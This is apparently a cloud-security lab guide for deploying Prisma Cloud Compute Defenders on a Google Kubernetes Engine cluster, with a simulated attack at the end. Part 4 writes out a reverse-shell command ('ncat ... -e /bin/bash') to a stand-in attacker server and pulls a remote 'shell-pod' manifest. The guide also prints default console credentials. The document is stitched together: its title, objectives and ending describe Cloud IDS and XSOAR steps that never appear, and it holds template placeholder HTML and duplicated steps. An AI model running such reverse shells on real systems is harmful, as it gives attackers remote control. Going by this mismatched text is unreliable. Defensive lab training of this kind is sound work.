# Enhanced Network Security Approach for Google Cloud


## Overview

In this lab, you will learn how Prisma Cloud Compute secures Google Kubernetes Engine (GKE) applications from a variety of runtime threats. 

## Objectives 

* **Part 1: Create a Cloud IDS Endpoint** 
  * **1a.** Configure the endpoint
* **Part 2: Protect Networks with VM-Series ML-NGFW** 
  * **2a.** Verify environment is ready
  * **2b.** Safely enable applications with App-ID
  * **2c.** Prevent internet inbound threats
  * **2d.** Prevent internet outbound threats
* **Part 3: Detect Threats & Applications with Google Cloud IDS**
  * **3a.** Configure a traffic mirroring policy
  * **3b.** Generate malicious traffic
  * **3c.** View Cloud IDS threat logs
  * **3d.** View Cloud IDS traffic logs
* **Part 4: Automate Response with Cortex XSOAR**
  * **4a.** Configure Google Cloud Pub/Sub
  * **4b.** Retrieve service account key file
  * **4c.** Create a black-list VPC firewall rule
  * **4d.** Configure Google Cloud XSOAR integrations
  * **4e.** Prepare Cloud IDS playbook
  * **4f.** Simulate & block malicious traffic






## Topology

**Prisma Cloud Compute** delivers a cloud workload protection platform (CWPP) for modern enterprises, providing holistic protection across hosts, containers, and serverless deployments in any cloud, throughout the software lifecycle. Prisma Cloud Compute Edition is cloud native and API-enabled, protecting all your workloads regardless of their underlying compute technology or the cloud in which they run. In addition, it provides Web Application and API Security (WAAS) for any cloud native architecture.

<img src="images/diagram.png" alt="diagram.png" width="700">


## Lab Startup

### Before beginning
 
To complete this lab, you'll need:
 
* An internet browser.
* Enough time to complete the lab (note the lab's completion time). 
* Once you start the lab, you will not be able to pause and return later (you begin at step 1 every time you start a lab).
* You do **NOT** need a Google Cloud account or project. The account, project, and associated resources are provided to you as part of this lab.
* If you have a personal/corporate Google Cloud account, make sure you do not use it for this lab.  We recommend running the lab in incognito mode to prevent making changes to your personal account.



### Launch the lab

1. When you are ready, click **Start Lab**.  Wait for the environment to finishing provisioning resources.

    <img src="images/startup/image01.png" alt="image01.png"  width="400" />



### Access the Google Cloud Console
After the lab resources are provisioned, you can access your lab environment's Google Cloud console. 

**Keep your Qwiklabs portal open in a separate browser tab or window.  The outputs generated in the Qwiklabs portal are used throughout the lab.**

1.  In the Qwiklabs portal, click the **Console** button. 
2.  Login with the **Console Username** and **Console Password**.
    
    <img src="images/startup/image02.png" alt="image02.png"  width="696" />****

3.  Accept the EULA agreements.
    
    <img src="images/startup/image03.png" alt="image03.png"  width="450" />



## Part 1. Access the GKE Cluster

In this section, we will access the GKE cluster.  We will also deploy a sample application that we will protect with Prisma Cloud in subsequent sections. 


### 1a. Authenticate to the cluster

We will authenticate to the cluster using Google Cloud Shell.  Cloud Shell provides command-line access to your Google Cloud resources.

1. Click **Activate Cloud Shell** at the top of the Google Cloud console. 
   
   <img src="images/cloudshell.png" alt="cloudshell.png"  width="700" />

2. In Cloud Shell, authenticate to the GKE cluster. 
    ```
    gcloud container clusters get-credentials cluster1 --region us-central1
    ```

3. Verify you have successfully authenticated to the cluster. 
    ```
    kubectl get nodes
    ```
    ---
    (output)
    ```
    NAME                                               STATUS   ROLES    AGE   VERSION
    gke-cluster-abcd-default-node-pool-32f1d830-3x9d   Ready    <none>   61m   v1.21.14-gke.14100
    gke-cluster-abcd-default-node-pool-7aa3e94c-n1rh   Ready    <none>   61m   v1.21.14-gke.14100
    gke-cluster-abcd-default-node-pool-ea6afb14-m5lt   Ready    <none>   61m   v1.21.14-gke.14100
    ```
    ---


### 1b.  Deploy a sample application

Here we will deploy a sample web application to our GKE cluster.

1. In Cloud Shell, create the sample web application deployment.

    ```
    git clone https://github.com/PaloAltoNetworks/prisma_cloud
    cd prisma_cloud
    kubectl create namespace sock-shop
    kubectl apply -f sock-shop.yaml
    ```

2. Verify the deployment progress. Proceed to the next step once all of the pods `READY` state show `1/1`.
    ```
    kubectl get pods -o wide -n sock-shop
    ``` 
    ---
    (output)
    
    ```
    NAME                           READY   STATUS    RESTARTS   AGE    IP           NODE                                               NOMINATED NODE   READINESS GATES
    carts-7c9df6fdb4-zhfbf         1/1     Running   0          3m6s   10.20.0.5    gke-cluster-abcd-default-node-pool-ea6afb14-m5lt   <none>           <none>
    carts-db-69694db7bf-g7pp7      1/1     Running   0          3m6s   10.20.1.8    gke-cluster-abcd-default-node-pool-32f1d830-3x9d   <none>           <none>
    catalogue-7c6dcb64f7-h9426     1/1     Running   0          3m5s   10.20.0.6    gke-cluster-abcd-default-node-pool-ea6afb14-m5lt   <none>           <none>
    catalogue-db-96f6f6b4c-9gzdx   1/1     Running   0          3m5s   10.20.1.6    gke-cluster-abcd-default-node-pool-32f1d830-3x9d   <none>           <none>
    front-end-7b8bcd59cb-tqttd     1/1     Running   0          3m5s   10.20.1.7    gke-cluster-abcd-default-node-pool-32f1d830-3x9d   <none>           <none>
    orders-c9994cff9-xt24r         1/1     Running   0          3m4s   10.20.1.9    gke-cluster-abcd-default-node-pool-32f1d830-3x9d   <none>           <none>
    orders-db-659949975f-7xctd     1/1     Running   0          3m4s   10.20.0.4    gke-cluster-abcd-default-node-pool-ea6afb14-m5lt   <none>           <none>
    payment-8576977df5-rs5z5       1/1     Running   0          3m4s   10.20.0.7    gke-cluster-abcd-default-node-pool-ea6afb14-m5lt   <none>           <none>
    queue-master-bbb6c4b9d-tlmvm   1/1     Running   0          3m4s   10.20.1.10   gke-cluster-abcd-default-node-pool-32f1d830-3x9d   <none>           <none>
    rabbitmq-6d77f74dc-2c5g2       1/1     Running   0          3m3s   10.20.2.11   gke-cluster-abcd-default-node-pool-7aa3e94c-n1rh   <none>           <none>
    shipping-5d7c4f8bbf-xn76v      1/1     Running   0          3m3s   10.20.1.11   gke-cluster-abcd-default-node-pool-32f1d830-3x9d   <none>           <none>
    user-846f474c46-cfqfz          1/1     Running   0          3m2s   10.20.2.12   gke-cluster-abcd-default-node-pool-7aa3e94c-n1rh   <none>           <none>
    user-db-5f68d7b558-26twv       1/1     Running   0          3m3s   10.20.0.8    gke-cluster-abcd-default-node-pool-ea6afb14-m5lt   <none>           <none>
    ```
    ---

3. Retrieve the service's external IP of the sample application.
   
    ```
    kubectl get service front-end -n sock-shop
    ```
    <html>
    <body>
        <pre>
        <div class="output_box">
        NAME        TYPE           CLUSTER-IP      EXTERNAL-IP      PORT(S)        AGE
        front-end   LoadBalancer   10.30.158.128   34.134.135.226   80:30001/TCP   8m21s
        </div>
        </pre>
    </body>
    </html>



4. Copy the `EXTERNAL-IP` and paste it into a new browser tab.  The following page should appear. 

    <img src="images/sockshop.png" alt="sockshop.png"  width="700" />




## Part 2. Deploy Prisma Cloud Compute Defenders on GKE

In this section, we will configure the Prisma Cloud Compute console. We will also configure Prisma Cloud Defenders to automatically protect the GKE cluster.  Prisma Cloud leverages Docker’s ability to grant advanced kernel capabilities to enable Defender to protect your whole stack, while being completely containerized and utilizing a least privilege security design.

Defenders enforce the policies you set in Console. They come in a number of different flavors. Each flavor is designed for protecting specific types of cloud-native resources and for optimal deployment into the environment, with full support for automated workflows. Use the following flow chart to choose the best Defender for the job.

### 2a. Access the Prisma Cloud Console
1. On the Qwiklabs console, copy & paste the **Prisma Cloud Console** output into a web browser tab.  

1. Accept the certificate error and access the Prisma Cloud Console with the following credentials. 
    
    Username: `paloalto`
    Password: `Pal0Alt0@123`


2. Go to **Manage → Defenders → Names**.  Select **Click to Add** to add the console's address to the SAN list. 

    <img src="images/2a_02.png" alt="2a_02.png"  width="700" />

    **Re-accept the certificate error to log back into the Prisma Cloud Console.**


### 2b. Deploy Defenders to the GKE cluster

1. On the Prisma Cloud Console, click **Deployed Defenders → Manual Deploy**

    <img src="images/2b_01.png" alt="2b_01.png"  width="900" />

2. Configure the Deployment settings as follows.
   1. **Method**: `Orchestrator`
   2. **Orchestrator type**: `Kubernetes`
   3. **PCC Name**: *`SAN name you previously added`*
   4. **Workstation Platform**: `Linux x86_64`
   5. **Docker Container Runtime**: *`Check ON`*
   6. **Collect Deployment and Namespace labels**: *`Check ON`*
        
        <img src="images/2b_02.png" alt="2b_02.png"  width="450" />

3. Under **Installation Scripts → Install**, click **Copy**.

    <img src="images/2b_03.png" alt="2b_03.png"  width="400" />


4. Go to Cloud Shell, from the `/prisma_cloud` directory. Paste the install script to deploy the Defenders.
    
    ---
    (output)
    
    ```
    defender daemonset written successfully to /home/usr/prisma_cloud/defender.yaml
    Creating namespace - twistlock
    Defender daemonset installation completed
    ```
    ---

5. On the Prisma Cloud console, click **Deployed Defenders**.  A Defender is deployed for each node in the GKE cluster.
   
    <img src="images/2b_04.png" alt="2b_04.png"  width="900" />


## Part 3. Prisma Cloud Runtime Defense for Containers

Prisma Cloud Runtime defense contains a set of features to provide **predictive protection** and **threat-based protection** for  containers. For example:

* **Predictive protection** includes capabilities like determining when a container runs a process not included in the original image or creates an unexpected network socket.  
* **Threat-based protection** includes capabilities like detecting when malware is added to a container or when a container connects to a botnet. 

These protections are delivered through an array of sensors that monitor the filesystem, network, and process activity.  Each sensor is implemented with its own set of rules and alerts.  This unified architecture simplifies the administrator experience and also illustrates what Prisma Cloud automatically learns from each image. 

### 3a.  View container model of Sock Shop

1. On the Prisma Cloud Console, go to **Radars → Containers**. Select **cluster1**.

    <img src="images/3a_01.png" alt="3a_01.png"  width="600" />

2. Click the **mongo:latest** container to view all information Prisma Cloud has found about the container.  
    <img src="images/3a_02.png" alt="3a_02.png"  width="600" />


3. (Optional) Feel free to explore additional findings by Prisma Cloud.  For example:
   1. Click **Vulnerabilities** to see the various CVEs associated with the selected container.
        <img src="images/3a_03.png" alt="3a_03.png"  width="600" />
   2. Click **mongo:latest → Processes** to view all the processes executed by the container.
        <img src="images/3a_04.png" alt="3a_04.png"  width="600" />




## Part 4. Threat Simulation

In this section, we will simulate a reverse shell attack.  In this scenario, the attacker operates as the listener and the victim as the initiator. The attacker looks for initiators that send out remote connection requests for a specific port and forces them to connect to the listener. This enables the attacker to deliver additional malware to the network to ultimately exfiltrate sensitive data. 


### 4a. Create attacker pod
1. Create an attacker pod that will initiate the reverse connection to a malicious server. 
   ```
   kubectl apply -f https://raw.githubusercontent.com/mattmclimans/lab-works/main/shell-pod.yaml
   ```

2. Log into the attacker pod.
   ```
   kubectl exec --stdin --tty shell-pod -- /bin/bash
   ```

3. Create a reverse shell connection to the attacker's server.
   ```
   ncat 10.5.2.100 80 -e /bin/bash
   ```

4. Go to Cloud Shell and access the attacker's server.  This server serves as the command and control server to control the pod creating the reverse shell connection.



<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
      .alert_box {
        background: #FFF0F0;
        color: black;
        margin: 0px auto;
        width: 700px;
        padding: 10px;
        border-radius: 3px;
      }
    </style>
    <style>
      .output_box {
        background: #2B2B2B;
        color: white;
        font-family: monospace;
      }
    </style>
  </head>
</html>

<html>
  <body>
    <!-- This is the markup of your box, in simpler terms the content structure. -->
    <div class="alert_box">
        Content
    </div>
  </body>
</html>




1. Retrieve the service's external IP of the sample application.
   
    ```
    kubectl get service front-end -n sock-shop
    ```
    
    <b>(output)</b><br>
    
    <html><body><pre><div class="output_box">
    NAME        TYPE           CLUSTER-IP      EXTERNAL-IP      PORT(S)        AGE
    front-end   LoadBalancer   10.30.158.128   34.134.135.226   80:30001/TCP   8m21s
    </div></pre></body></html>

</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>
</br>

## Congratulations! You've completed the lab!
 
 You have learned how to leverage VM-Series and Cloud IDS to provide in-line and out-of-band network prevention across your Google Cloud networks.  You have also learned how to leverage Cortex XSOAR to provide end-to-end orchestration and remediation for security events detected by Cloud IDS.
